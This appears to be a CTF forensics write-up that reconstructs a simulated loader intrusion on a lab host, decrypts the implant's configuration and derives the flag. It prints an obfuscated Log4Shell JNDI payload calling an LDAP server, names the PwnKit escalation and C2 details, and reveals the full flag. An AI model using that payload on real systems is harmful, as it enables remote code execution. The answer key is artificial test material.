# BurhanGuild Loader Incident - Writeup

## Overview
- **Category:** Forensics
- **Points:** 100
- **Author:** PolarBear7
- **Flag:** `COMPFEST18{8urh4n9u1ld_0r10n_148_m3m0ry_0n1y_104d3r_c453_c1053d_4f73r_5upp1y_ch41n_7r4c3_826df6b2a62673a1a6cbbb1c63244dd8ddc2933381f52723343274716fabde}`

## Analysis & Methodology

### 1. Evidence Triage & Disinformation Filtering
We are provided with volatile captures in a custom `BGMR v3` binary format (`capture_*.raw`) and deleted disk pages (`page_*.bin`), accompanied by an integrity manifest (`integrity_manifest.json`).
The manifest establishes the scope:
- Target Host: `orion-lab`
- Window: `2026-05-05T11:05:00Z` - `2026-05-05T11:12:00Z`

Inspecting the deleted pages reveals carved zip files in odd-numbered pages containing `case_fragment.json` and `transfer.log`. Only `page_05.bin` references `host: orion-lab` and `capture_id: A812` (all others reference `staging-node`).

### 2. Incident Timeline Reconstruction (`capture_A812.raw`)
Correlating `capture_A812.raw` reveals the full attack chain on `orion-lab`:
1. **Initial Exploitation:** Log4Shell (CVE-2021-44228) against `java` (PID 4693). Heap analysis reveals the JNDI payload:
   `${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://172.19.0.66:1389/BurhanGuild}`
2. **Privilege Escalation:** PwnKit (CVE-2021-4034) executed via `pkexec` (PID 4742) with `GCONV_PATH=/tmp/.bg/gconv`.
3. **Execution & Masquerading:** Loader PID 4787 masquerading as `[kworker/u8:7]` sets mutex `BG_MUTEX=bguild-ce104cb0`.
4. **Memory Injection:** Anonymous `memfd:libpam_bg.so (deleted)` mapped `rwxp` with Build ID `542715c2e46252e4d790`.
5. **C2 & Staging:** C2 connection established to `morrow-gate.wreckit.invalid:8443`; staging archive `/dev/shm/.bg-cache/e0bafe9e.zip` (recovered from `page_05.bin`, size 473 bytes) was deleted.

### 3. Binary Reverse Engineering & Decryption
Carving record kind 9 (`carve-region`) from `capture_A812.raw` yields the ELF shared library `carved_A812.so`.
- Function `0x1500` decrypts the embedded `CFG3` configuration block.
- Key derivation at `0x1100` uses a custom mixer over Blowfish $\pi$-fraction constants with:
  1. Mutex string: `bguild-ce104cb0`
  2. Nonce (8 bytes from heap PID 4693): `\xa0\x1f\xb1\xf6\x1e\x91\x16\xa6`
  3. Build ID (10 bytes from ELF header): `542715c2e46252e4d790`
- Block cipher at `0x13e0` performs XTEA-CTR decryption.

### 4. Configuration & Token Construction
Decrypted config reveals:
```json
{
  "c2_domain": "morrow-gate.wreckit.invalid",
  "c2_port": 8443,
  "campaign": "side-door-crown",
  "closure_contract": {
    "digest_algorithm": "sha256",
    "digest_fields": [
      "jndi_normalized",
      "build_id",
      "implant_id",
      "c2_domain",
      "archive_sha256"
    ],
    "digest_separator": "|",
    "token_schema": "BGLPROOF{orion-lab__cap-{capture_id}__loader-{loader_pid}__implant-{implant_id}__build-{build_id}__config-{config_sha256}__archive-{archive_sha256}__digest-{digest}}"
  },
  "crc32": "b41d727b",
  "exfil_path": "/api/v3/guild/sync",
  "implant_id": "BG-94C2A04EC6",
  "magic": "BGCF",
  "sleep_jitter": 37,
  "version": 3
}
```

Computing the digest with:
- `jndi_normalized` = `${jndi:ldap://172.19.0.66:1389/BurhanGuild}`
- `build_id` = `542715c2e46252e4d790`
- `implant_id` = `BG-94C2A04EC6`
- `c2_domain` = `morrow-gate.wreckit.invalid`
- `archive_sha256` = `4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a`
- `config_sha256` = `360251a5def08d12cb71e72d5a1609b0d34c9dfc9520197ad8b0cc2cd7cfb76b`

Yields the token:
`BGLPROOF{orion-lab__cap-A812__loader-4787__implant-BG-94C2A04EC6__build-542715c2e46252e4d790__config-360251a5def08d12cb71e72d5a1609b0d34c9dfc9520197ad8b0cc2cd7cfb76b__archive-4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a__digest-836d4fce93ec7b3077ab7c97820d29515ea5609cf346e40b76973ca37e2418ed}`

Submitting this token to the authorized questionnaire service yields the flag.
